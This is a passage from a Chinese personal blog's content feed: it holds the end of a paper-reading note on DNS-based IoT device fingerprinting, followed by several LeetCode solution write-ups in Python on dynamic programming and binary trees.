title="讨论和限制"></a>讨论和限制</h2><ul><li>DNS流量轻量，易收集，信息粒度低。</li><li>本文基于DNS的IoT指纹能够模拟IoT设备DNS行为，能够精确检测许多IoT设备（即是该IoT设备托管在NAT后还是和其它非IoT设备混杂一起）</li></ul><ul><li><p>某些情况下，基于DNS的流量模型无法捕捉同一供应商生产的不同设备之间的差异</p></li><li><p>同时，每当发现IoT指纹匹配通过相关检测阈值时，我们的系统不仅报告已经检测到设备，还报告具有什么相似性。因此，当相似性不相同时，它可以用作一种置信度得分，以便通过选择具有最高相似性的设备来消除不同设备的歧义。</p></li></ul><ul><li><p>当大量(例如，数百个)物联网和非物联网设备托管在同一IP之后(例如，在同一NAT之后)时，准确检测物联网设备变得越来越困难。尽管如此，我们表明，我们的统计指纹仍然能够正确检测各种各样的物联网设备，而不会出现误报，即使在这种具有挑战性的情况下也是如此</p></li><li><p>目前我们的系统无法识别一个域名系统测试背后有多少相同设备的实例。主要原因是域名系统缓存效果可能会“压缩”查询频率信息，从而难以识别表现出相同域名系统行为的设备的确切数量</p></li></ul><p>自然，我们的方法仅限于非加密的域名系统流量，因为我们需要访问查询的域名。最近，出现了使用DoH (RFC8484)或DoT (RFC7858)加密DNS流量的趋势。特别是，集中式DoH可能是一个问题，因为它可能会阻止本地网络运营商(包括互联网服务提供商)收集有关其客户端生成的域名系统流量的详细信息。然而，我们应该考虑一些观察结果。首先，DoH可能会对其他现有的安全应用程序产生负面影响，有人提议尝试防止这种情况[22]。其次，DoH目前大多局限于浏览器发布的DNS查询。因此，如果DoH成为主要浏览器的默认协议，物联网设备可能更容易检测到，因为它们的域名系统查询将与少量的非域名系统流量混合在一起。未来的物联网设备最终也可能开始采用DoH或DoT。然而，对于许多资源受限且不允许添加DNS加密软件的传统物联网设备来说，它们的DNS流量特征可能会变得越来越明显。最后，虽然采用DoH的新(或更新的)物联网设备可能会被直接的互联网服务提供商监控所隐藏，但我们的方法仍然有效，因为它可以由DoH运营商(如谷歌或Cloudflare)而不是单个互联网服务提供商来应用，以估计互联网上的物联网设备数量</p>]]></content>
      
      
      <categories>
          
          <category> PapersReading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PapersReading </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】91.解码方法</title>
      <link href="2020/12/13/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-91.%20%E8%A7%A3%E7%A0%81%E6%96%B9%E6%B3%95/"/>
      <url>2020/12/13/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-91.%20%E8%A7%A3%E7%A0%81%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>dp数组，单变量</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一条包含字母 A-Z 的消息通过以下方式进行了编码：</p><pre><code>&apos;A&apos; -&gt; 1&apos;B&apos; -&gt; 2...&apos;Z&apos; -&gt; 26</code></pre><p>给定一个只包含数字的非空字符串，请计算解码方法的总数。</p><p>题目数据保证答案肯定是一个 32 位的整数。</p><p>示例1：</p><pre><code>输入：s = &quot;12&quot;输出：2解释：它可以解码为 &quot;AB&quot;（1 2）或者 &quot;L&quot;（12）。</code></pre><p>示例2：</p><pre><code>输入：s = &quot;226&quot;输出：3解释：它可以解码为 &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), 或者 &quot;BBF&quot; (2 2 6) 。</code></pre><p>示例3：</p><pre><code>输入：s = &quot;0&quot;输出：0</code></pre><p>示例4：</p><pre><code>输入：s = &quot;1&quot;输出：1</code></pre><p>示例5：</p><pre><code>输入：s = &quot;2&quot;输出：1</code></pre><p>注：</p><pre><code>1 &lt;= s.length &lt;= 100s 只包含数字，并且可能包含前导零。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>算法分析：</p><ul><li>利用动态规划进行处理，如下情况讨论：<ul><li>dp[i]为str[0..i]的译码方法总数</li><li>分情况讨论：（建立最优子结构）<ul><li>若s[i]=‘0’，若s[i-1]=‘1’or ‘2’，则dp[i]=dp[i-2]；否则return 0<blockquote><p>解释：s[i-1]+s[i]唯一被译码，不增加情况</p></blockquote></li><li>若s[i-1]=‘1’，则dp[i]=dp[i-1]+dp[i-2]<blockquote><p>解释：s[i-1]与s[i]分开译码，为dp[i-1]；合并译码，为dp[i-2]</p></blockquote></li><li>若s[i-1]=‘2’且‘1’&lt;=s[i]&lt;=‘6’，则dp[i]=dp[i-1]+dp[i-2]<blockquote><p>解释：同上</p></blockquote></li></ul></li><li>由分析可知，dp[i]仅可能与前两项有关，故可以用单变量代替dp[]数组，将空间复杂度从O(n)降到O(1)</li></ul></li></ul><h3 id="方法一：dp数组"><a href="#方法一：dp数组" class="headerlink" title="方法一：dp数组"></a>方法一：dp数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numDecodings</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>]==<span class="string">'0'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        dp =[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">        dp[<span class="number">-1</span>]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(s)):</span><br><span class="line">            <span class="keyword">if</span> s[i]==<span class="string">'0'</span>:</span><br><span class="line">                <span class="keyword">if</span> s[i<span class="number">-1</span>]==<span class="string">'1'</span> <span class="keyword">or</span> s[i<span class="number">-1</span>]==<span class="string">'2'</span>:</span><br><span class="line">                    dp[i]=dp[i<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">'1'</span> <span class="keyword">or</span> (s[i - <span class="number">1</span>] == <span class="string">'2'</span> <span class="keyword">and</span>  s[i] &gt;= <span class="string">'1'</span> <span class="keyword">and</span> s[i] &lt;= <span class="string">'6'</span>)):</span><br><span class="line">                    dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i]=dp[i<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">s=<span class="string">"1201234"</span></span><br><span class="line">result=a.numDecodings(s)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre><h3 id="方法二：单变量代替dp数组"><a href="#方法二：单变量代替dp数组" class="headerlink" title="方法二：单变量代替dp数组"></a>方法二：单变量代替dp数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numDecodings</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>]==<span class="string">'0'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        pre=<span class="number">1</span></span><br><span class="line">        cur=<span class="number">1</span> <span class="comment"># pre=dp[-1]=1  cur=dp[0]=1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(s)):</span><br><span class="line">            tmp=cur</span><br><span class="line">            <span class="keyword">if</span> s[i]==<span class="string">'0'</span>:</span><br><span class="line">                <span class="keyword">if</span> s[i<span class="number">-1</span>]==<span class="string">'1'</span> <span class="keyword">or</span> s[i<span class="number">-1</span>]==<span class="string">'2'</span>:</span><br><span class="line">                    cur = pre</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">'1'</span> <span class="keyword">or</span> (s[i - <span class="number">1</span>] == <span class="string">'2'</span> <span class="keyword">and</span>  s[i] &gt;= <span class="string">'1'</span> <span class="keyword">and</span> s[i] &lt;= <span class="string">'6'</span>)):</span><br><span class="line">                    cur = cur +pre</span><br><span class="line">            pre=tmp</span><br><span class="line">        <span class="keyword">return</span> cur</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">s=<span class="string">"1201234"</span></span><br><span class="line">result=a.numDecodings(s)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】701.二叉搜索树中的插入操作</title>
      <link href="2020/12/09/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-701.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/"/>
      <url>2020/12/09/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-701.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>二叉搜索查找，插入</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据 保证 ，新值和原始二叉搜索树中的任意节点值都不同。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回 任意有效的结果 。</p><p>示例1</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201209binarytree01.png" width="600px"><pre><code>输入：root = [4,2,7,1,3], val = 5输出：[4,2,7,1,3,5]解释：另一个满足题目要求可以通过的树是：</code></pre><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201209binarrytree02.png" width="300px"><p>示例2</p><pre><code>输入：root = [40,20,60,10,30,50,70], val = 25输出：[40,20,60,10,30,50,70,null,null,25]</code></pre><p>示例3</p><pre><code>输入：root = [4,2,7,1,3,null,null,null,null,null,null], val = 5输出：[4,2,7,1,3,5]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>思路与算法</p><p>首先回顾二叉搜索树的性质：对于任意节点 root 而言，左子树（如果存在）上所有节点的值均小于root.val，右子树（如果存在）上所有节点的值均大于 root.val，且它们都是二叉搜索树。</p><p>因此，当将 val 插入到以root 为根的子树上时，根据 val 与 root.val 的大小关系，就可以确定要将val 插入到哪个子树中。</p><ul><li>如果该子树不为空，则问题转化成了将 val 插入到对应子树上。</li><li>否则，在此处新建一个以 val 为值的节点，并链接到其父节点root 上</li></ul><p>复杂度分析</p><p>时间复杂度：O(N)，其中 N 为树中节点的数目。最坏情况下，我们需要将值插入到树的最深的叶子结点上，而叶子节点最深为 O(N)</p><p>空间复杂度：O(1)。我们只使用了常数大小的空间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insertIntoBST</span><span class="params">(self, root: TreeNode, val: int)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> TreeNode(val)</span><br><span class="line">        </span><br><span class="line">        pos = root</span><br><span class="line">        <span class="keyword">while</span> pos:</span><br><span class="line">            <span class="keyword">if</span> val &lt; pos.val:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> pos.left:</span><br><span class="line">                    pos.left = TreeNode(val)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pos = pos.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> pos.right:</span><br><span class="line">                    pos.right = TreeNode(val)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pos = pos.right</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">root = [<span class="number">40</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">70</span>]</span><br><span class="line">val = <span class="number">25</span></span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.insertIntoBST(root_tree,val)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】124.二叉树中的最大路径和</title>
      <link href="2020/12/08/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-124.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C/"/>
      <url>2020/12/08/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-124.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<p>递归，最优</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空二叉树，返回其最大路径和。</p><p>本题中，路径被定义为一条从树中任意节点出发，沿父节点-子节点连接，达到任意节点的序列。该路径至少包含一个节点，且不一定经过根节点。</p><p>示例1</p><pre><code>输入：[1,2,3]       1      / \     2   3输出：6</code></pre><p>示例2</p><pre><code>输入：[-10,9,20,null,null,15,7]   -10   / \  9  20    /  \   15   7输出：42</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>路径每到一个节点，有 3 种选择：1. 停在当前节点。2. 走到左子节点。3. 走到右子节点。</p><p>走到子节点，又面临这 3 种选择，可以用递归。</p><p>注意！不能走进一个分支又掉头回来走另一个分支，路径会重叠。</p><p><strong>定义递归函数</strong></p><p>首先，考虑实现一个简化的函数 maxGain(node)，该函数计算二叉树中的一个节点的最大贡献值，具体而言，就是在以该节点为根节点的子树中寻找以该节点为起点的一条路径，使得该路径上的节点值之和最大。</p><p>具体而言，该函数的计算如下。</p><ul><li>空节点的最大贡献值等于 0。</li><li>非空节点的最大贡献值等于节点值与其子节点中的最大贡献值之和（对于叶节点而言，最大贡献值等于节点值）。</li></ul><p>一个子树内部的最大路径和 = 左子树提供的最大路径和 + 根节点值 + 右子树提供的最大路径和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.maxSum = float(<span class="string">"-inf"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxPathSum</span><span class="params">(self, root: TreeNode)</span> -&gt; int:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">maxGain</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 递归计算左右子节点的最大贡献值</span></span><br><span class="line">            <span class="comment"># 只有在最大贡献值大于 0 时，才会选取对应子节点</span></span><br><span class="line">            leftGain = max(maxGain(node.left), <span class="number">0</span>)</span><br><span class="line">            rightGain = max(maxGain(node.right), <span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 节点的最大路径和取决于该节点的值与该节点的左右子节点的最大贡献值</span></span><br><span class="line">            priceNewpath = node.val + leftGain + rightGain</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 更新答案</span></span><br><span class="line">            self.maxSum = max(self.maxSum, priceNewpath)</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 返回节点的最大贡献值</span></span><br><span class="line">            <span class="keyword">return</span> node.val + max(leftGain, rightGain)</span><br><span class="line">   </span><br><span class="line">        maxGain(root)</span><br><span class="line">        <span class="keyword">return</span> self.maxSum</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root = [<span class="number">-10</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.maxPathSum(root_tree)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>42</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】107.二叉树的层序遍历II</title>
      <link href="2020/12/07/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-107.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86%20II/"/>
      <url>2020/12/07/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-107.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86%20II/</url>
      
        <content type="html"><![CDATA[<p>迭代：广度优先遍历，递归：深度优先遍历</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）</p><p>例如：</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre><code>  3 / \9  20  /  \ 15   7</code></pre><p>返回其自底向上的层次遍历为：</p><pre><code>[  [15,7],  [9,20],  [3]]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：迭代"><a href="#方法一：迭代" class="headerlink" title="方法一：迭代"></a>方法一：迭代</h3><p>采用队列（FIFO），每层入队，统计该层结点数，每层出队完时，下一层入队。最后进行列表翻转即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    